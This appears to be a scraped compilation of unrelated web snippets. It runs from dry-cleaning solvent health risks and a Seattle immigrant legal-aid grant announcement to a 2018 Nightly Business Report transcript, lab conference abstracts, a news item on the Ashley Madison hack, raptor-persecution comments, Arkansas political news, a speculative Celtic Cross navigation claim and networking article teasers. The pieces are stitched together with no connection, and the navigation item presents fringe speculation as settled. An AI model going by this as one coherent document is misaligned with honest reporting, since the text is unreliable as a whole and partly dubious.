Most dry cleaning facilities in the United States use a chemical solvent called perchloroethylene to clean their garments. While having one close by can be convenient, living right next door to one might not be the best idea. According to the U.S. Environmental Protection Agency (EPA), short term exposure to this chemical can cause temporary impairment of the central nervous system. Long term exposure can cause liver damage, kidney damage, and possibly cancer. Fortunately, the chemical typically doesn't travel too far due to its volatility (tendency to evaporate quickly) . Perchloroethylene can also contaminate soil and groundwater if improperly handled.

City of Seattle, King County announce Legal Defense Fund awardees
August 28, 2017 by Office of the Mayor
Mayor Ed Murray and King County Executive Dow Constantine announced the community organizations that have been selected to receive $1.5 million in grants as part of the Legal Defense Fund to provide legal aid to vulnerable immigrants and refugees.
“I signed legislation in April establishing a $1 million-dollar immigrants’ Legal Defense Fund because immigrants are being targeted by a presidential administration that has embraced White Nationalism,” said Mayor Murray. “Today, with additional money from our partners at King County, we are awarding those defense fund dollars to community organizations like the Northwest Immigrant Rights Project, Kids in Need of Defense, and West African Community Council, because they advocate for immigrants every day in what’s now a larger fight to preserve core American principles of Democracy.”
“We are sending a clear, united message to the rest of the country – and to the world – that King County remains an inclusive community where all are welcome to build a better future,” said Executive Constantine. “The funding we announce today will help our partner organizations defend the human rights of more immigrants and refugees who contribute to the prosperity and vibrancy of our region.”
Direct Legal Representation – Total awarded: $1,423,358
To qualify for these funds, organizations must have an attorney on staff who is able to provide direct legal representation for low-income immigrants and refugees living in King County or working in Seattle who are in detention, facing removal, or in danger of losing their immigration status.
Kids in Need of Defense (KIND) – $235,454
Northwest Immigrant Rights Project (NWIRP) / Colectiva Legal del Pueblo – $1,187,904
Community Navigation Services – Total awarded: $111,642
To qualify for these funds, organizations must be able to provide guidance and referrals for low-income immigrants and refugees living in King County or working in Seattle who are in detention, facing removal, or in danger of losing their immigration status.
Filipino Community of Seattle – $30,000
South Park Information and Referral Center (SPIARC) – $27,145
West African Community Council (WACC) – $54,497
Over the course of two weeks, a panel comprised of members from the immigrant and refugee legal defense community, King County staff, and City of Seattle staff reviewed both written applications and oral presentations. Out of ten applications, five received awards.
Earlier this year, both the City and the County passed legislation authorizing these funds for legal defense and community navigation services, as President Donald Trump threatened immigrant and refugee communities through both his inflammatory rhetoric and unconstitutional executive orders.
In November 2016, Mayor Murray responded to the federal administration’s anti-immigrant actions by passing his Welcoming City Executive Order, which reinforced the City’s already existing policy that employees do not ask about citizenship status and serve all residents regardless of immigration status. The order also mandated funding for peer support groups and counseling for immigrant and refugee middle and high school youth, legal assistance for immigrant families with children in Seattle Public Schools, and a comprehensive public awareness effort around reporting discriminatory harassment. The City of Seattle also bolstered community collaboration, education, and access to know-your-rights information and resources and created the Inclusive and Equitable Cabinet to address threats to civil rights, including to immigrant and refugee communities.
In March of this year, Councilmembers M. Lorena González and Tim Burgess joined with Mayor Murray in announcing their intent to pass legislation creating the fund. Seattle joins Los Angeles, San Francisco, New York, and Chicago as cities that have created programs to fund legal defense and other immigrant legal services. Unlike in criminal trials, individuals do not have a right to legal representation in immigration proceedings. However, studies have shown that people who were represented in U.S. immigration court were up to ten times more likely to obtain relief.
“Congratulations to each of the awardees of Seattle/King County’s pilot Legal Defense Fund. It is my sincere hope that funding these organizations will provide much needed protections against deportation for families that have built lives in the Seattle area,” said Councilmember M. Lorena González. “These organizations are committed to defending the constitutional rights of immigrants and refugees by providing access to quality civil legal aid. Together, our community navigators and civil legal aid organizations are on the frontline of protecting immigrants and refugees from ongoing attacks by the Trump Administration.”
“Access to a knowledgeable and trained legal advocate is invaluable during trying times, and can mean the difference between families being torn apart or staying together, or determining whether residents are able to continue the livelihoods that they’ve build over decades. We know that legal counsel can change the course of proceedings, especially for immigration procedures in which people are not automatically afforded this resource in the normal course of events.”
The City now begins negotiating the contracts detailing each of the grantees’ scope of work. The grantee organizations are expected to start offering services under the Legal Defense Fund after September 30.

Transcript: Nightly Business Report – June 5, 2018
June 5, 2018 | NBR Staff	
ANNOUNCER: This is NIGHTLY BUSINESS REPORT with Bill Griffeth and Sue
Herera.
SUE HERERA, NIGHTLY BUSINESS REPORT ANCHOR: Economic milestones. There
are more job openings than there are available workers. And that`s never
happened before.
BILL GRIFFETH, NIGHTLY BUSINESS REPORT ANCHOR: What`s brewing? Starbucks
(NASDAQ:SBUX) will start its next chapter without the man who turned it
into a household name and at a time when the company faces a number of
challenges.
HERERA: Death of an icon. Kate Spade turned a small handbag company into
a global brand. Today, she was found dead in her Manhattan apartment.
Those stories and more tonight on NIGHTLY BUSINESS REPORT for Tuesday, June
5th.
GRIFFETH: And we do bid you good evening, everybody.
During an otherwise quiet day on Wall Street, the Nasdaq composite closed
at a record and we`ll have more on that coming up.
But we begin tonight with a significant moment in our economic history. We
learned today that right now, there are more available jobs than there are
people out of work. That is something the American economy has never
experienced before.
The Labor Department`s latest report shows that there are a record 6.7
million job openings in April, while the number of available workers was
6.4 million. That is the first time that has happened since the government
began tracking job openings back in 2000.
Now, to put this in perspective, when the Great Recession ended nine years
ago this month, there were about six unemployed people for every job
opening at that time. And it`s just the latest sign that the U.S. is
facing an historically tight labor market.
HERERA: And, Bill, those positive numbers on the jobs market come
alongside some sobering news on the state of social security. Costs for
that program will exceed its income this year for the first time since
1982, forcing the program to dip into its trust fund to cover benefits. It
is estimated that those reserves will be depleted by the year 2034 and
Social Security will no longer be able to send full benefits.
The report also said that Medicare`s hospital insurance fund will be
depleted in 2026. That is three years earlier than anticipated.
GRIFFETH: Meanwhile, a new report says leading CEOs are a little less
optimistic than they have been. According to the latest survey from the
Business Roundtable, many are concerned about the direction of trade policy
right now.
Kayla Tausche has detailed for us from Washington.
(BEGIN VIDEOTAPE)
KAYLA TAUSCHE, NIGHTLY BUSINESS REPORT CORRESPONDENT: For the first time
since Donald Trump was elected president, a quarterly reading of confidence
among CEO has fallen. The survey conducted by the Business Roundtable
showed that expectations for the next six months for hiring, capital
investment, sales, and U.S. GDP all declined. One major reason: trade.
Ninety-five percent of executives citing White House trade policy as a
moderate or serious risk.
Business Roundtable CEO Josh Bolton and chair, JPMorgan`s Jamie Dimon told
reporters they`d advise the White House against tariffs and protectionist
policies to no avail. One hundred and thirty-two CEOs responded to the
survey during the middle two weeks of May, when the White House was
negotiating trade deals on NAFTA and with China, two fronts where friction
has only increased in the weeks since.
NEC director Larry Kudlow said the U.S. may pursue separate deals with
Canada and Mexico to replace the current trilateral deal, and a White House
team in Beijing reportedly rebuffed an offer from China to buy $70 billion
in U.S. energy and crops.
Here`s White House Press Secretary Sarah Sanders.
SARAH HUCKABEE SANDERS, WHITE HOUSE PRESS SECRETARY: Our focus is on
making sure we get good deals. I`m not here to make an announcement on
what those look like, but he`s going to continue pushing forward to make
sure that he gets the best deal for American workers.
TAUSCHE: A campaign promise turning into a C-suite headache.
For NIGHTLY BUSINESS REPORT, I`m Kayla Tausche in Washington.
(END VIDEOTAPE)
HERERA: On Wall Street, as we mentioned, the Nasdaq closed at a fresh
record, helped by shares of Netflix (NASDAQ:NFLX) and Amazon (NASDAQ:AMZN).
And while tech stocks powered ahead, the rest of the market struggled for
gains. The Dow Jones Industrial Average fell 13 points. The Nasdaq was up
31 and the S&P $ 500 gained two points, nearly two.
Now, some say the market is facing some pretty tough hurdles and investors
want to know if those hurdles can be cleared. So, Mike Santoli takes a
look.
(BEGIN VIDEOTAPE)
MIKE SANTOLI, NIGHTLY BUSINESS REPORT CORRESPONDENT: Stock market bulls
have plenty to be proud of after two months of hard-won progress, but they
still have a bit more to prove. The S&P 500 index is up more than 6
percent since early April, grinding higher through a thicket of concerns,
including trade tensions, rising interest rates, increasing inflation
pressures and fears of new regulation on tech giants.
The slow climb has taken the index right up to a key threshold. The 27.50
level has capped earlier rallies and where a nasty drop occurred in mid-
March. This is a pretty natural area for the index to stall for a while as
investors assess the underlying strength of the economy and the potential
danger of trade policy moves and the Federal Reserve`s rate-boosting
campaign.
The leadership of the market remains sturdy, but selective. The Nasdaq is
fully recovered from the correction that started in January, and it`s back
at a fresh all-time high. Small company stocks are also at a new record.
These are positives for the bull case, but also a reminder that the drivers
of the market`s comeback have been narrow.
Only three major sectors, tech, consumer discretionary, and energy have
outperformed the S&P 500 as a whole since the index was last at its current
level nearly three months ago. The momentum in corporate profits has been
powerful. The only question being how much growth will slow into 2019.
The latest little push higher for stocks coincided with a pullback in oil
prices and an easing back of bond yields, on more soothing talk from the
Fed and a flutter of global market turbulence that sent investors to the
shelter of treasuries.
And so, as the market heads for the higher end of its choppy 2018 range,
and new economic reports continue to show impressive strength, the next
test for the bulls might come as those ten-year treasury yields make
another run above 3 percent and the Fed has its say next week.
For NIGHTLY BUSINESS REPORT, I`m Mike Santoli.
(END VIDEOTAPE)
GRIFFETH: Time to take a look now at some of today`s upgrades and
downgrades.
We begin with video game maker Take Two Interactive, which was downgraded
from outperform at BMO Capital Markets. The analyst there cites high
expectations for an upcoming video game release which it says could
disappoint. Price target: $116. The stock fell a fraction to $113.26.
Meanwhile, First Solar (NASDAQ:FSLR) shares were downgraded to neutral from
buy at Bank of America (NYSE:BAC). The analyst cites China`s decision to
suspend construction of new solar farms and to cut subsidies. Price target
now $63 and that stock fell more than 5.5 percent today to $58.24.
HERERA: And Bank of America (NYSE:BAC) is also making a call on
Weightwatchers, rating the company a buy in new coverage. The analyst says
the stock could rise another 20 percent from current levels. The price
target is $95. The stock was up 8 percent today to $85.93.
Shares of Occidental Petroleum (NYSE:OXY) were upgraded to buy from neutral
at Citi. The analyst cites rising oil prices and a potential increase in
production growth this year and next. The price target is $97. The stock
closed up a fraction to $85.51.
GRIFFETH: The woman who created an iconic accessories empire that made her
name synonymous with trendy handbags was found dead today in her Manhattan
apartment. Designer Kate Spade was 55 years old. The cause of death is
being reported as a suicide.
Our Courtney Reagan now has more on her influence in the fashion world and
the legacy she leaves behind.
(BEGIN VIDEOTAPE)
COURTNEY REAGAN, NIGHTLY BUSINESS REPORT CORRESPONDENT: The retail and
fashion industries are mourning the loss of the designer known as Kate
Spade. They`ve launched her original eponymous handbag brand Kate Spade in
1993.
Twenty-five years ago, Kate Spade, the brand, begun with six utilitarian
hand bags and a variety of colors. The brand was the first premium
American handbag maker to use nylon for its base material.
Kate Spade, her husband, and partners sold their majority stake to Neiman
Marcus (NYSE:MCS) in 1999 for around $34 million, and the remaining stake
in 2006 for $59 million.
The Kate Spade brand has only grown. After changing ownership several
times, Tapestry, which also owns Coach (NYSE:COH) and Stuart Weitzman,
bought the Kate Spade brand for nearly $2.5 billion last year, eleven years
after spade sold her are remaining stake in the company she founded.
The Kate Spade brand is still known today for its bright colors, feminine,
whimsical aesthetic, and kitschy marketing. Kate Spade handbags, shoes,
accessories and clothing are sold around the world, bringing in more than
$1 billion in annual sales.
Two years ago, she, along with her husband, Andy Spade, and the duo`s
original two other business partners, launched a new handbag and shoe
brand, Frances Valentine, around the same time she changed her name to Kate
Valentine. Frances Valentine also shares colorful shoes and handbags in
department stores, boutiques and online, globally, with that still familiar
aesthetic that Kate Spade is known for, but with higher prices because of
production in Italy and Spain.
No official word from Frances Valentine on its future after the death of
its founder.
For NIGHTLY BUSINESS REPORT, I`m Courtney Reagan.
(END VIDEOTAPE)
HERERA: Still ahead tonight on NIGHTLY BUSINESS REPORT, America`s most
famous coffee chain embarks on a whole new chapter.
(MUSIC)
HERERA: As we reported last night, Starbucks (NASDAQ:SBUX) executive
chairman Howard Schultz is stepping down from the company he helped to
build. Andrew Ross Sorkin broke the story and spoke to Mr. Schultz today
about his next act.
(BEGIN VIDEOTAPE)
ANDREW ROSS SORKIN, NIGHTLY BUSINESS REPORT CORRESPONDENT: We`re here in
Seattle where we sat down exclusively with Howard Schultz, the outgoing
executive chair of Starbucks (NASDAQ:SBUX) who announced plans to step down
from the company he said among other things that he may pursue in the
future, public service, which, of course, has fueled speculation he could
run for president in 2020. I asked him directly about that prospect.
HOWARD SCHULTZ, EXECUTIVE CHAIRMAN, STARBUCKS: There`s a lot of things I
can do as a private citizen other than run for the presidency of the United
States, and let`s just see what happens. I`ve got lots of things I`m
thinking about. I`m writing a book. It`s only been 24 hours.
But we`ve talked many times about how concerned I am about the country, our
standing in the world, and I think there`s many things I can do as a
private citizen to advance the cause of the promise of the country.
SORKIN: While he said he has not made a decision yet about what he`s going
to do in the future, he did have a number of views on public policy.
SCHULTZ: Ronald Reagan in 1986 passed an immigration bill as a Republican
president, so why can`t we come together, move the ideology out, and do
what`s in the interest of American people? Seventy percent of the American
people want a good immigration policy. Seventy percent of the American
people want the kind of policy and legislation that takes the guns of war
out of the American people`s neighborhoods. I mean, it just doesn`t make
sense to me.
SORKIN: Intriguingly, he had a fascinating take on how to think about
today`s economy and the stock market.
SCHULTZ: I think it`s very wrong to use the stock market as a proxy for
the U.S. economy. Interest rates are going up, and if I had to make a bet,
and I`m not an economist, I don`t believe that the stock market is going to
continue to grow at the level it has between now and 2020. You`re going to
see a sea change.
So, listen, the economy is strong. I give President Obama credit for that.
I give President Trump some credit for that. But you also have systemic
problems in the country, the likes of which we have not had in a long time.
SORKIN: Howard Schultz stepping off the Starbucks (NASDAQ:SBUX) stage but
probably not stepping out of the headlines.
I`m Andrew Ross Sorkin for NIGHTLY BUSINESS REPORT in Seattle.
(END VIDEOTAPE)
GRIFFETH: Well, Starbucks (NASDAQ:SBUX) investors aren`t too happy about
the departure of Howard Schultz. The news sent shares of the stock lower
in trading today. No doubt those same investors want to know what is next
for Starbucks (NASDAQ:SBUX) and how the company plans to overcome a number
of challenges.
Kate Rogers (NYSE:ROG) has that part of the story for us tonight.
(BEGIN VIDEOTAPE)
KATE ROGERS, NIGHTLY BUSINESS REPORT CORRESPONDENT: It`s a new era for
Starbucks (NASDAQ:SBUX), as founder and executive chairman Howard Schultz
steps away from the brand he made into a household name over the past 30-
plus years.
SCHULTZ: Please come in.
ROGERS: Now, the focus is on Kevin Johnson, the company`s CEO who has been
at the helm since last year. The two men worked closely together and
analysts say the move presents an opening for Johnson to step out of
Schultz` shadow.
RJ HOTTOVY, MORNINGSTAR SENIOR RESTAURANT ANALYST: I think this will be an
opportunity for Kevin to really show himself and that he doesn`t
necessarily need to rely strictly on Howard and, you know, frankly, can
leverage the experience and talents of the rest of the team.
ROGERS: Schultz` departure comes at a time when the competition for
consumer dollars is fierce as companies from Dunkin Donuts to McDonald`s
(NYSE:MCD) are offering steeper values on coffee. Starbucks (NASDAQ:SBUX)
is focused on mobile as well as the consumer experience with its reserve
bars and roasteries in Seattle and Shanghai, with openings in Milan and New
York later this year.
Starbucks (NASDAQ:SBUX) is also in the midst of an ever growing push into
China, where it opens a new store once every 15 hours. A big challenge on
Johnson`s plate, increasing same store sales in the U.S. which has been
stagnant. Experts say Johnson needs to focus on innovation and technology.
HOTTOVY: I think that they need to iron out the mobile order platform and,
you know, make that — and improve the experience in the stores. I think
once they start to do that, I think that the Starbucks (NASDAQ:SBUX) brand,
you know, will kind of right the ship there.
ROGERS: Another bright spot in the leadership change, the appointment of
Myron Ullman to executive chairperson who turned around struggling retailer
JCPenney not once, but twice in the past.
For NIGHTLY BUSINESS REPORT, I`m Kate Rogers (NYSE:ROG).
(END VIDEOTAPE)
HERERA: Well, it has been reported by “The New York Times (NYSE:NYT)” that
Howard Schultz may consider a run for the presidency in 2020, and Andrew
Ross Sorkin addressed that earlier in our program. Well, today, Home
Depot`s co-founder and philanthropist Ken Langone said that if more people
with business experience get involved in politics, it`s a good thing.
(BEGIN VIDEO CLIP)
KEN LANGONE, HOME DEPOT CO-FOUNDER: Howard Schultz, Jamie Dimon, Mike
Bloomberg, if we get those kind of people to say, hey, he won and I can
win, we`re going to dramatically open the pool of talent for people to
become president. And by the way, that`s great.
(END VIDEO CLIP)
HERERA: And that got us thinking about how business backgrounds could play
a role in public office.
Joining us to talk about that is Jeffery Sonnenfeld, management professor
and senior associate dean for leadership studies at Yale School of
Management.
Welcome back, Jeffrey. Nice to see you again.
JEFFREY SONNENFELD, YALE SCHOOL OF MANAGEMENT: Thanks, Sue. Good to see
you. And hi, Bill.
HERERA: Does it matter whether or not the business executive and we`ve had
many business executives transfer into government roles, does it matter
whether they come from a private company or a public company? Does one
give an advantage over the other?
SONNENFELD: That`s a great question. You know, that was the fine point in
Andrew Ross Sorkin`s interview with Howard Schultz today, that he wanted to
make that point without coming across like he is starting up a slug fest
with the president. But he was suggesting that a, you know, a midsize
family business as the Trump Organization is, that has some global reach,
doesn`t, you know, maybe a dozen countries, doesn`t compare to the
magnitude of what Starbucks (NASDAQ:SBUX) has in 75 countries with some, I
don`t know, 38,000 stores and things.
They`re almost as big in terms of the number of stores as McDonald`s
(NYSE:MCD).
GRIFFETH: Right.
SONNENFELD: Yes, it makes a big difference, being accountable to bosses,
to a board, to disparate constituencies, difficult bottom line criteria to
meet and things. As a public CEO, it`s a very different experience than
being a private CEO. I don`t want to diminish what Donald Trump has
accomplished. I think as a CEO of a private business, it`s pretty
impressive, but what the scrutiny and everything that a public company has
to go under, there`s nothing like it, and none of the predecessors of our
current CEOs have had as difficult a job as the current generation has.
GRIFFETH: There have been other successful businessmen in the White House,
though, Jeff. You had Herbert Hoover, who was a mining magnate. He made
his fortune in mining. H.W. Bush made his fortune in oil. That just names
two of them.
How are they different from other people who have been in the White House?
How is their thinking different as business people?
SONNENFELD: It`s funny you mention those two, Bill. It`s because Douglas
Brinkley, the presidential historian, used those two in an article today to
say, look, CEOs don`t transfer into public office that well. Look how
troubled those careers were that Herbert Hoover, who by all accounts was a
wonderful human being, was not a wonderful president. And “W” who was also
a wonderful human being won`t be ranked as one of our finest presidents,
George W. Bush.
But, you know, for a historian, that was a strange thing to pick. You
could also say being a governor was bad because George W. Bush was a
governor. Andrew Johnson was governor of Tennessee. You had a lot of —
Jimmy Carter was governor of Georgia.
(CROSSTALK)
GRIFFETH: By the same token, George Washington was a very successful
farmer, you know, which was a big business back in those days. So there`s
a —
SONNENFELD: Good for you. He was a farmer, and for that point, you know,
Harry Truman, you know, he was a haberdasher. That`s what my dad did. I
think that was a pretty important position.
But there were some who were very successful that were never senators and
never were governors, never really had an elected position like that
exactly. Abraham Lincoln wasn`t a governor, was never a senator. There
are some very impressive models that way.
But business leaders have done well. Michael Bloomberg, of course, is
mayor, which is the next toughest job after president is mayor of New York
City. He certainly did very well.
And there are many business leaders who went into public service who were
successful business leaders but even more renowned for their legacies in
public service, like Averell Harriman who ran his dad`s railroad, the Union
Pacific (NYSE:UNP) and Brown Brothers Harriman; and Chester Bowles, a great
advertising exec. These people are people are fantastic diplomats.
HERERA: Lots of examples, indeed. Jeff, thank you very much. Jeffrey
Sonnenfeld with Yale School of Management.
Bill?
GRIFFETH: Elsewhere, we`ve got G-III apparel posting a surprise profit and
that`s where we begin tonight`s “Market Focus”.
The owner of Guess and DKNY said that there was demand for many of its
brands and that helps sales and profits topped estimates. The clothing
company also raised its earnings guidance for the full year. Shares rose
more than 10 percent today to $47.53.
Navistar warned that its profit margins would be pressured this year by a
higher freight costs and an expected rise in sales for its less profitable
trucks. The company says its auto parts business, its more profitable
division, will likely see flat growth and that news overshadowed an
otherwise upbeat full year outlook and the stock fell a fraction to $38.35.
Allergan (NYSE:AGN) is being urged by two of its biggest shareholders to
split the roles of chairman and chief executive into two separate roles.
Hedge funds Appaloosa Management and Senator Investment Group are also
calling on the drug maker to reconsider its acquisition strategy and shake
up management, all in an effort to give new life to Allergan`s stock which
today was up to $152.21.
HERERA: The pharmaceutical company Mylan (NASDAQ:MYL) said the FDA has
approved its drug that`s intended to prevent infections in patients
undergoing chemotherapy. Mylan (NASDAQ:MYL) said it plans to market the
medication the coming weeks. The shares finished up nearly 4 percent to
$39.98.
And shares of Twitter get a three-year high on news that it will join the
S&P 500 index. The social media company is replacing seed maker Monsanto
(NYSE:MON), which is merging with Bayer. The change will take effect
before the market opens on Thursday. Twitter`s shares jumped 5 percent to
finish the day at $39.80.
GRIFFETH: Coming up, why big tech is pouring big money into the race for
San Francisco mayor.
(MUSIC)
HERERA: Facebook (NASDAQ:FB) and Google (NASDAQ:GOOG) are being sued by
Washington state`s attorney general. He says the companies failed to
maintain information about political advertising. That information is
required by law and it includes data about buyers of political ads. The
cost, how much they paid, and the candidate or ballot measure at issue.
Washington candidates and political committees have reportedly spent about
$5 million to advertise on those platforms in the past decade.
GRIFFETH: Some big tech companies are taking sides in the San Francisco
mayoral race and they have been pouring a lot of money into campaigns.
That`s because the stakes are high for a critical American industry.
Aditi Roy has more.
(BEGIN VIDEOTAPE)
ADITI ROY, NIGHTLY BUSINESS REPORT CORRESPONDENT: San Francisco is about
to elect a new mayor in a wide open race and many voters have strong
opinions about the issues important to them.
UNIDENTIFIED FEMALE: I understand the tech companies coming in, but the
problem is that they have pushed out a lot of the old-time residents.
UNIDENTIFIED MALE: Two problems. One is mentally ill homeless people, and
two is drug addicts.
ROY: There are eight candidates running for mayor, but the top three
contenders appear to be London Breed, Jane Kim, and Mark Leno.
And the city`s housing crisis seems to be front and center in the race.
That`s where tech leaders come in. Companies like Twitter, Airbnb, and
Uber have all moved into San Francisco the last few years, and the infusion
of highly paid engineers has been blamed for the city`s housing crisis and
rise of homelessness.
Many tech leaders are looking for solutions to these problems. While all
the candidates addressed those topics, Breed, the front runner, appears to
have the most aggressive plan for building more homes. She`s pledged to
create at least 5,000 units of housing per year and has backed removing
homeless people from the streets. Medium CEO Evan Williams has donated
$100,500 to a committee supporting here. And venture capitalist Ron Conway
and his wife Gayle have also contributed.
Jane Kim is proposing a $1 billion bond to stabilize the housing market and
wants to make shelters more accessible and deploy mobile showers for
homeless people. Her tech backers include the CEOs of start-up Automatic
and Zendesk. They donated $100,000 and also $50,000 respectively to a
committee supporting Kim.
The tech footprint has expanded in recent years in part because of the
policies of late Mayor Ed Lee, whose sudden death in December sparked
today`s election. Voters we talked to seemed divided on tech`s influence
in San Francisco.
UNIDENTIFIED MALE: Without the tech companies, you don`t have all this
fabulous infrastructure.
ROY: Even though many high-profile tech leaders are supporting Breed, it`s
unclear whether she`ll follow in lee`s footsteps in embracing tech
companies. In 2016, she even introduced legislation that would have
regulated Airbnb.
For NIGHTLY BUSINESS REPORT, I`m Aditi Roy, San Francisco.
(END VIDEOTAPE)
HERERA: The first state in the Union, today, became the first state
outside of Nevada to take wagers on sports betting and this comes just a
few weeks after the Supreme Court lifted the federal ban. Betting is
taking place at three Delaware casinos and will offer wagering on baseball,
football, basketball, soccer, golf, and auto racing. Other states are
expected to follow.
GRIFFETH: Finally tonight, the latest list of the world`s highest paid
athletes is out. According to Forbes, Floyd Mayweather is at the top spot
again. This the fourth time in the last seven years, total earnings last
year, $285 million.
Number two, soccer player Lionel Messi. Payday of $111 million. Rounding
out the top three , fellow soccer player Cristiano Ronaldo at $108 million.
By the way, the 100 highest paid athletes earned a collective $3.8 billion
during the past 12 months. That is up more than 20 percent from a year
ago.
HERERA: That`s it for us tonight. Have a great night.
GRIFFETH: See you tomorrow.

Why are we doing what we do? Does it really add value?
Overcoming Legacy Obstacles with Innovative Approaches
Oral Presentation

Contact Information: [email protected]; 412-963-2421
ABSTRACT
The presentation will challenge a number of the legacy practices in both the laboratory and the environmental industry. We have come to accept that they are the common industry standard does it really add value to the data quality or the program? Is there a technical basis for the practice or has it been an administrative determination that has survived unchallenged for decades? How do we move forward eliminating non-value added practices, using technology to improve data quality and reduce costs. A number of examples will be provided to facilitate discussion among the various stakeholders.

Automated Sampling of Methanol Extractions
Poster-Vendor
Poster Presentation
Prepared by
Contact Information: [email protected]; 513-642-0100
ABSTRACT
The United States Environmental Protection Agency (USEPA) Method 8260 is used in order to ascertain volatile organic compounds in waters, soils and solid waste samples. Often times, soil and solid waste samples are so highly contaminated the sample needs to be dispersed in methanol. Sample collection for contaminated soils can be obtained in two ways. One, dispersing a bulk soil sample into a 40ml vial and adding methanol in the lab or two, sending pre-weighed vials with a septum sealed cap that already contains the pre-requisite methanol out in the field for soil sampling. No matter how the soil sample is dispersed in methanol, an aliquot of the methanol extract needs to be added to water and purged using USEPA Method 5030. This application will investigate automated sampling of methanol soil extractions.

Two suicides may be connected to Ashley Madison hack: police
August 24, 2015 SecurityAshley Madison, Cheating, Chuo Bussan Corp, Cyberwarfare, Hacker, Hacking, Sexual fidelitysmbale
(CBC) – At least two suicides may be connected to the hacking of the Ashley Madison cheating website that exposed the information of clients, and its parent company is offering a C$500,000 ($379,132) reward to catch the hackers, Toronto police said on Monday.
In addition to the exposure of the Ashley Madison accounts of as many as 37 million users, the attack on the infidelity website has sparked extortion attempts and at least two unconfirmed suicides, Toronto Police Acting Staff Superintendent Bryce Evans told a news conference.
The data dump contained email addresses of U.S. government officials, UK civil servants, and workers at European and North American corporations, taking already deep-seated fears about Internet security and data protection to a new level.

How many years have we being informing the above about the tax free ‘back hands’ in shooting!Wake up Chris. It is the main reason for killing Birds of Prey.

If genuine, which I think it is, this interview is further confirmation of
the pernicious behaviour of certain sporting agents. Providing a valued service,to a point,their profession as a whole is being dragged through the peat by certain high profile individuals,whose actions are beginning to have an effect far beyond the estates they manage.
I think it was Guy Shorrock, who declared that their ranks included the number one wildlife criminal in the UK?…,his opinion, not necessarily mine.
Incidentally Mr Miles, the untaxed bonuses do not always move down the ladder,in fair reflection of the work put in !.
Persecution Reports
If anyone has any information about the illegal persecution of raptors, either in the UK or abroad, PLEASE forward details immediately to Raptor Politics via our confidential “contact us” link.
If you read in the national or your local press of any persecution incidents, please send this information to Raptor Politics immediately.
Thank you.

Submitted by Holly Nicole Morrison, Digital Content Producer
Thursday, April 2nd, 2015, 3:40pm
LITTLE ROCK, Ark. (KTHV) -- The Arkansas House of Representatives passed Senate Bill 975 to enact the Religious Freedom Restoration Act (RFRA) Thursday afternoon. It is now headed for Governor Asa Hutchinson's desk for signature.
On Wednesday, just hours after Gov. Hutchinson announced he wouldn't be signing HB 1228 in its current form, Republicans in the House and Senate drafted amendments to two other bills in hopes of keeping the RFRA alive in Arkansas.

Arkansas Legislature to remain under GOP control
Submitted by THV 11 News Staff
Wednesday, November 5th, 2014, 5:55am
LITTLE ROCK, Ark. (AP) - Republicans have locked up control of the Arkansas Legislature for 2015.
The GOP on Tuesday won at least 62 seats in the 100-member House, while Democrats took at least 34. Results are pending on four races.
In the 35-member Senate, Republicans will hold a 24-11 margin after winning all four races decided Tuesday.
Republicans also won all seven constitutional offices.
In 2012, Republicans won control of the Legislature for the first time since Reconstruction, clinching 51 seats. Afterward, lawmakers passed one of the strictest abortion laws in the country and approved a voter ID law - but both laws were later found unconstitutional.
Legislators also passed a bipartisan plan to expand health coverage to more than 200,000 people by using Medicaid money to buy private health insurance for poorer Arkansans.

AG: Ruling 'clear' no voter ID for election
Submitted by THV 11 News Staff
Thursday, October 16th, 2014, 2:41pm
LITTLE ROCK, Ark. (AP) - The state's top lawyer and top election official say the Arkansas Supreme Court's decision striking down a voter ID law means the requirement to show photo identification before casting ballots won't be in effect for the November election.
A spokesman for Attorney General Dustin McDaniel said Thursday that the court's decision is "clear" that the law doesn't apply to the upcoming election. Early voting for the Nov. 4 election begins Monday.
Secretary of State Mark Martin's office said the ruling means the law reverts back to what it was before voter ID took effect this year, and voters won't be required to show photo identification at the polls.
The court unanimously struck down the law on Wednesday, saying it violated the constitution by adding a qualification for voting.

Counties call for jail overcrowding solution
Submitted by THV 11 News Staff
Tuesday, October 7th, 2014, 8:38pm
LITTLE ROCK, Ark. (KTHV) - Officials from all 75 Arkansas counties are demanding answers on how state officials plan to reform prison funding.
Because of overcrowding, state inmates have to be housed at county jails, taking up space reserved for inmates within those counties.
County officials say the state requires they hold their own inmates and maintain prison conditions at a state specified level.
However, the problems counties say they face are space for the inmates and full reimbursement from the state.
"We need to get the state to start taking responsibility for their own inmates. They're forcing. They're basically... They're not basically but they're forcing the counties to violate the rights of our inmates by not running a constitutional jail," said David Lucas, Jackson County Sheriff.

Celtic Cross Symbolized Wheel Mechanism for Ancient Oceanic Navigation & Mapping According to Earth’s Axial Precession Rate
May 17, 2017
Translate:
Crichton Miller says he received a british patent for the “wheel cross” navigation device, depicted anciently as Celtic Cross statuary, it enables measurement of the positions of the stars in order to navigate across the ocean, the element of time measure accommodated by knowing the movement of the appearance of the constellations because of the earth’s axial precession rate (see Page here Great Pyramid for Navigation), however, Miller still disavows this obvious solution to the meaning of geometry because it was rediscovered by a young earth creationist abhorred by the new age types.

7 Step Plan To Get Going With Networking
Whether you're an introvert or an extrovert, feel like you have the gift of gab or just don't know how to make small talk, networking know-how is very important for your business success. There is a notion in business that I believe most of us subscribe to that says "all things being equal, people will do business with and refer business to those they know, like and trust.
Powerful Networking: Focus on Building Connections, Not Closing Sales
You can find numerous references in the business literature about the importance of a company's mission. These sources emphasize that the mission is not to make a profit; that a profit is the outcome of and reward for fulfilling the mission.
Communication Is A 2-Way Street (The Networking Factor)
The Personal Touch 1There is a simple art to networking and the good news is, should you choose to put forth a conscience effort to improve the way you communicate, networking can and will become second nature to you, it is really just that simple. A personal touch big or small makes a big difference in how others perceive you professionally and personally as well.
Networking - How To Do It
Networking is probably the oldest, easiest, most effective and least expensive way to get more business. It doesn't necessarily involve selling your product or service but it does mean selling yourself.
8 Ways To Develop Confidence In New Situations
Do you enjoy one-on-one networking, however, the thought of walking into room full of people you don't know horrifies you? You're not alone. Yes, even a social butterfly, President of the Social Committee in High School and avid networker knows how you feel.
You Can't Spell Networking Without Serendipity
"Fear not to entertain strangers for by so doing some have entertained angels unaware."This quotation is from the book of Hebrews, which means it probably has nothing to do with networking.
What I Do Is Not Who I Am... The Networking Factor
Ah, the personal touch that continues to make a big difference for the better in our lives and the lives of those who have an opportunity to experience a personal touch from us.If networking and effective communication are centered on other people, can we effectively network or communicate without the help of other people?For the sake of argument, let us define networking as: finding out what another individual wants or needs and then fulfilling the want or need of that other person.
Giving the Gift of Your Name (The Networking Factor)
